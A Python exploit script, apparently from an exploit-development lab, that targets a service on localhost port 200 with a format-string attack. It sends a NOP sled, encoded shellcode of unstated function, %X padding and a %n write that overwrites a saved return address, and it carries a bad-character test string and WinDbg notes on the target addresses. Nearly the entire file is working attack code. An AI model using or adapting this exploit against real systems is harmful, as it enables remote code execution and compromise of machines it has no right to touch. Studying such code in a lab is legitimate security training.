import socket
import struct

RHOST = "localhost"
RPORT = 200

ret = struct.pack("I", 0x0012e0f0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# _buffer = "A" * 400 + "%X" * 1000 + "%99999d" + "%119999d" + "%999999d" + "%2620d" + "C" * 1000 + "%n" + "B" * 377 + "D" * 4 + ret + "C" * 100
# _buffer = "\xCC" * 400 + "%X" * 1000 + "%99999d" + "%119999d" + "%999999d" + "%2836d" + "C" * 1000 + "%n" + "B" * 377 + ret + "C" * 100

payload_length = 400

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
        "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
        "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
        "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
        "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
        "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
        "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
        "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
        "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
        "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
        "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
        "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
        "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
        "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# _buffer = "\xCC" * 400 + "%X" * 1000 + "%99999d" + "%119999d" + "%999999d" + "%2836d" + "C" * 1000 + "%n" + "B" * 377 + "D" * 4 + badchars + "C" * 100

shellcode =  ""
shellcode += "\xba\xc3\xd0\x50\x6a\xdb\xd8\xd9\x74\x24\xf4\x5d"
shellcode += "\x2b\xc9\xb1\x52\x31\x55\x12\x83\xed\xfc\x03\x96"
shellcode += "\xde\xb2\x9f\xe4\x37\xb0\x60\x14\xc8\xd5\xe9\xf1"
shellcode += "\xf9\xd5\x8e\x72\xa9\xe5\xc5\xd6\x46\x8d\x88\xc2"
shellcode += "\xdd\xe3\x04\xe5\x56\x49\x73\xc8\x67\xe2\x47\x4b"
shellcode += "\xe4\xf9\x9b\xab\xd5\x31\xee\xaa\x12\x2f\x03\xfe"
shellcode += "\xcb\x3b\xb6\xee\x78\x71\x0b\x85\x33\x97\x0b\x7a"
shellcode += "\x83\x96\x3a\x2d\x9f\xc0\x9c\xcc\x4c\x79\x95\xd6"
shellcode += "\x91\x44\x6f\x6d\x61\x32\x6e\xa7\xbb\xbb\xdd\x86"
shellcode += "\x73\x4e\x1f\xcf\xb4\xb1\x6a\x39\xc7\x4c\x6d\xfe"
shellcode += "\xb5\x8a\xf8\xe4\x1e\x58\x5a\xc0\x9f\x8d\x3d\x83"
shellcode += "\xac\x7a\x49\xcb\xb0\x7d\x9e\x60\xcc\xf6\x21\xa6"
shellcode += "\x44\x4c\x06\x62\x0c\x16\x27\x33\xe8\xf9\x58\x23"
shellcode += "\x53\xa5\xfc\x28\x7e\xb2\x8c\x73\x17\x77\xbd\x8b"
shellcode += "\xe7\x1f\xb6\xf8\xd5\x80\x6c\x96\x55\x48\xab\x61"
shellcode += "\x99\x63\x0b\xfd\x64\x8c\x6c\xd4\xa2\xd8\x3c\x4e"
shellcode += "\x02\x61\xd7\x8e\xab\xb4\x78\xde\x03\x67\x39\x8e"
shellcode += "\xe3\xd7\xd1\xc4\xeb\x08\xc1\xe7\x21\x21\x68\x12"
shellcode += "\xa2\x31\x6d\x1c\x33\xa6\x6f\x1c\x33\xbe\xf9\xfa"
shellcode += "\x59\xae\xaf\x55\xf6\x57\xea\x2d\x67\x97\x20\x48"
shellcode += "\xa7\x13\xc7\xad\x66\xd4\xa2\xbd\x1f\x14\xf9\x9f"
shellcode += "\xb6\x2b\xd7\xb7\x55\xb9\xbc\x47\x13\xa2\x6a\x10"
shellcode += "\x74\x14\x63\xf4\x68\x0f\xdd\xea\x70\xc9\x26\xae"
shellcode += "\xae\x2a\xa8\x2f\x22\x16\x8e\x3f\xfa\x97\x8a\x6b"
shellcode += "\x52\xce\x44\xc5\x14\xb8\x26\xbf\xce\x17\xe1\x57"
shellcode += "\x96\x5b\x32\x21\x97\xb1\xc4\xcd\x26\x6c\x91\xf2"
shellcode += "\x87\xf8\x15\x8b\xf5\x98\xda\x46\xbe\xa9\x90\xca"
shellcode += "\x97\x21\x7d\x9f\xa5\x2f\x7e\x4a\xe9\x49\xfd\x7e"
shellcode += "\x92\xad\x1d\x0b\x97\xea\x99\xe0\xe5\x63\x4c\x06"
shellcode += "\x59\x83\x45"

_buffer = "\x90" * 5 + "\x90" * 5 + shellcode + "\x90" * (400-len(shellcode)-10) + "%X" * 1000 + "%99999d" + "%119999d" + "%999999d" + "%2838d" + "C" * 1000 + "%n" + "B" * 377 + ret + "C" * 100

s.send(_buffer)
s.close()

# 0012cd60 <- ret to start of buffer
# 0012dc44 <- badcharacters
# 0012e0f0 <- pointer to ret address of pr function
# 0041178c <- ret address of pr function
# 66399961 8902            mov     dword ptr [edx],eax
# edx is last 4 digits of our exploit payload, which needs to be the pointer 0012e0f0
# eax needs to be the return address 0012cd60 
# exploit cannot have any int3, when your exploit code "returns" to the start of the buffer, it must have exactly
# 5 0xcc and 5 0x90 when you are debugging with windbg